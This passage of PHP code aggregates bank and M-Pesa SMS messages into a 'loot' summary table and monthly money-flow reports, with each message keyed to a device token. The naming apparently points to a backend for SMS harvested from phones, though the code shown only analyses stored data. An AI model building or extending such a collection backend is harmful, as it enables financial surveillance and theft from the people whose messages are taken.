            'sms_from_ncba'             => 'info_Get_from_NCBA',
            'sms_from_kcb'              => 'info_Get_from_KCB',
            'sms_from_im_bank'          => 'info_Get_from_IM',
            'sms_reversal'              => 'info_Get_from_Reversal',
            'sms_balance_mpesa'         => 'info_Get_Bal_MPESA',
            'sms_balance_kcb'           => 'info_Get_Bal_KCB',
            'sms_balance_mshwari'       => 'info_Get_Bal_Mshwari',
            'sms_loan_limit'            => 'info_Loan_Limit',
            'sms_sent'                  => 'info_Sent_to_MPESA',
            'sms_sent_to_lnm'           => 'info_Sent_to_LNM',
            'sms_sent_mini'             => 'info_Sent_Mini',
            'sms_sent_to_mshwari'       => 'info_Sent_to_Mshwari',
            'sms_sent_cancel'           => 'info_Sent_Cancel',
            'sms_error_failed'          => 'info_Error_Failed',
            'sms_error_pin'             => 'info_Error_Pin',
            'sms_error_insufficient'    => 'info_Error_Less',
            'sms_error_receiver'        => 'info_Error_Receiver',
            'sms_error_receiver_org'    => 'info_Error_Receiver_Org',
            'sms_withdraw'              => 'info_Withdraw',
            'sms_fuliza_opt_out'        => 'info_Fuliza_Opt_Out',
            'sms_fuliza_opt_in'         => 'info_Fuliza_Opt_In',
            'sms_fuliza_limit'          => 'info_Fuliza_Limit',
            'sms_fuliza_loan_paid'      => 'info_Fuliza_Loan_Paid',
            'sms_fuliza_mini_statement' => 'info_Fuliza_Mini_Statement',
            'sms_fuliza_loan_taken'     => 'info_Fuliza_Loan_Taken',
            'sms_similar_transaction'   => 'info_Similar_Transaction',
            'sms_unknown'               => 'info_Unknown',
        ];

        $summary = [];
        $total = 0;
        foreach ($mapping as $patternKey => $summaryField) {
            $count = (int) ($counters[$patternKey] ?? 0);
            $summary[$summaryField] = $count;
            $total += $count;
        }

        $summary['info_All'] = $total;
        $summary['loot_Uuid'] = $uuid;
        
        // Convert Unix timestamp to formatted date string for DATETIME column
        $summary['loot_Created'] = is_numeric($date) ? date('Y-m-d H:i:s', (int)$date) : $date;

        // Also write legacy column if it still exists
        $fields = $this->db->getFieldNames('tbl_Loot_Summary');
        if (in_array('info_Get_Received', $fields, true)) {
            $summary['info_Get_Received'] = $summary['info_Get_from_MPESA'] ?? 0;
        }

        $ok = $this->db->table('tbl_Loot_Summary')->insert($summary);
        if (!$ok) {
            $error = $this->db->error();
            throw new \RuntimeException(
                'Failed to save loot summary: ' . ($error['message'] ?? 'unknown DB error')
            );
        }

        return true;
    }

    /**
     * Get top counterparties from analyzed data
     */
    public function getTopCounterparties(int $limit = 5, ?string $deviceToken = null): array {
        if (!$this->db->tableExists('tbl_Analyzed_Transactions')) return [];

        $builder = $this->db->table('tbl_Analyzed_Transactions a')
            ->select('a.counterparty, SUM(a.amount) as total_amount, COUNT(*) as trans_count')
            ->where('a.counterparty !=', 'Unknown')
            ->groupBy('a.counterparty')
            ->orderBy('total_amount', 'DESC')
            ->limit($limit);
            
        if ($deviceToken) {
            $builder->join('tbl_Sms s', 's.sms__id = a.orig_sms_id', 'left')
                    ->where('s.sms_owner', $deviceToken);
        }

        return $builder->get()->getResult();
    }

    /**
     * Get full report data for a given month/year
     */
    public function getReportData(int $year, int $month): array {
        $daysInMonth  = date('t', mktime(0, 0, 0, $month, 1, $year));
        $monthStr     = sprintf('%04d-%02d', $year, $month);

        $labels   = [];
        $inflow   = [];
        $outflow  = [];

        // Build daily data
        $allSms = $this->db->table('tbl_Sms')->get()->getResult();

        // Index SMS by date
        $byDate = [];
        foreach ($allSms as $sms) {
            $normalized = $this->normalizeDate($sms->sms_time);
            $dateKey    = substr($normalized, 0, 10); // YYYY-MM-DD
            if (substr($dateKey, 0, 7) !== $monthStr) continue;
            $byDate[$dateKey][] = $sms;
        }

        for ($d = 1; $d <= $daysInMonth; $d++) {
            $dateKey    = sprintf('%04d-%02d-%02d', $year, $month, $d);
            $labels[]   = date('d', strtotime($dateKey));
            $dayIn      = 0;
            $dayOut     = 0;

            foreach ($byDate[$dateKey] ?? [] as $sms) {
                $body   = strtolower(base64_decode($sms->sms_body));
                $amount = $this->extractAmount($body);
                $cat    = strtolower($sms->sms_category);
                if ($cat === 'received') $dayIn += $amount;
                elseif (in_array($cat, ['sent', 'sent to lnm', 'withdraw'])) $dayOut += $amount;
            }

            $inflow[]  = $dayIn;
            $outflow[] = $dayOut;
        }

        // Totals
        $totalIn  = array_sum($inflow);
        $totalOut = array_sum($outflow);
        $net      = $totalIn - $totalOut;

        // Category breakdown (all SMS in this month)
        $categories = ['Received' => 0, 'Sent' => 0, 'Withdraw' => 0, 'Fuliza' => 0, 'Other' => 0];
        foreach ($byDate as $rows) {
            foreach ($rows as $sms) {
                $body   = strtolower(base64_decode($sms->sms_body));
                $amount = $this->extractAmount($body);
                $cat    = strtolower($sms->sms_category);
                if ($cat === 'received') $categories['Received'] += $amount;
                elseif (in_array($cat, ['sent', 'sent to lnm'])) $categories['Sent'] += $amount;
                elseif ($cat === 'withdraw') $categories['Withdraw'] += $amount;
                elseif (strpos($cat, 'fuliza') !== false) $categories['Fuliza'] += $amount;
                else $categories['Other'] += $amount;
            }
        }

        // Top counterparties this month (from analyzed or raw)
        $topCounterparties = [];
        if ($this->db->tableExists('tbl_Analyzed_Transactions')) {
            $rows = $this->db->table('tbl_Analyzed_Transactions')
                ->select('counterparty, SUM(amount) as total_amount, COUNT(*) as trans_count')
                ->where("DATE_FORMAT(trans_date, '%Y-%m')", $monthStr)
                ->where('counterparty !=', 'Unknown')
                ->groupBy('counterparty')
                ->orderBy('total_amount', 'DESC')
                ->limit(5)
                ->get()->getResult();
            $topCounterparties = $rows;
        }

        // Transaction count
        $txCount = 0;
        foreach ($byDate as $rows) $txCount += count($rows);

        return [
            'year'              => $year,
            'month'             => $month,
            'month_name'        => date('F', mktime(0, 0, 0, $month, 1, $year)),
            'labels'            => $labels,
            'inflow'            => $inflow,
            'outflow'           => $outflow,
            'total_in'          => $totalIn,
            'total_out'         => $totalOut,
            'net'               => $net,
            'categories'        => $categories,
            'top_counterparties'=> $topCounterparties,
            'tx_count'          => $txCount,
        ];
    }
}
